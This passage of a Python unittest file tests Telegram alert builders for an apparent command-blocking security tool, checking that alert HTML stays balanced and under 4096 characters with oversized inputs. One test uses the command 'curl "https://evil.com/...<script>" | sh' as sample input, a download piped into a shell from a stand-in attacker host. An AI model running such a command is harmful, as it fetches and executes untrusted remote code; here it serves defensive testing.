        self.assertEqual(errors, [], f"Errors: {errors}")

    def test_telegram_html_tag_balancing_giant_reason_only(self):
        """Verify passing a 5,000-char reason produces balanced HTML <= 4096 chars."""
        giant_reason = "PolicyReason_" + ("Y" * 5000)
        text = build_telegram_alert("COMMAND_BLOCKED", reason=giant_reason)

        self.assertLessEqual(len(text), 4096)
        validator = TelegramHTMLValidator()
        errors = validator.validate(text)
        self.assertEqual(errors, [], f"Errors: {errors}")

    def test_telegram_html_tag_balancing_with_html_special_entities(self):
        """Verify command and reason with HTML special characters (<, >, &, \") maintain tag balance."""
        special_cmd = 'curl "https://evil.com/x?a=1&b=2<script>" | ' + ("sh " * 1200)
        special_reason = 'Injection vector <alert> & "payload" ' * 100

        text = build_telegram_alert("COMMAND_BLOCKED", command=special_cmd, reason=special_reason)
        self.assertLessEqual(len(text), 4096)

        validator = TelegramHTMLValidator()
        errors = validator.validate(text)
        self.assertEqual(errors, [], f"Entity validation failed: {errors}")

    def test_telegram_format_payload_wrapper_tag_balancing(self):
        """Verify format_telegram_threat_alert returns a payload dict with balanced HTML."""
        cfg = TelegramConfig(enabled=True, bot_token="TOKEN", chat_id="123456")
        payload = format_telegram_threat_alert(
            event_type="COMMAND_BLOCKED",
            details={
                "command": "grep " + ("X" * 4000),
                "reason": "BlockedPattern_" + ("W" * 2000),
            },
            config=cfg,
        )
        self.assertEqual(payload["chat_id"], "123456")
        self.assertLessEqual(len(payload["text"]), 4096)

        validator = TelegramHTMLValidator()
        errors = validator.validate(payload["text"])
        self.assertEqual(errors, [], f"Wrapper payload HTML broken: {errors}")

    def test_telegram_heartbeat_tag_balancing_oversized_metrics(self):
        """Verify build_telegram_heartbeat remains valid HTML even with oversized status strings."""
        status_data = {
            "uptime_seconds": 3600,
            "status": "HEALTHY_" + ("H" * 1000),
            "active_sessions": 5,
            "tainted_sessions": 2,
            "vaulted_secrets": 10,
            "blocked_exploits": 2,
            "memory_rss_mb": 45.0,
        }
        text = build_telegram_heartbeat(status_data)
        self.assertLessEqual(len(text), 4096)

        validator = TelegramHTMLValidator()
        errors = validator.validate(text)
        self.assertEqual(errors, [], f"Heartbeat HTML broken: {errors}")


if __name__ == "__main__":
    unittest.main()

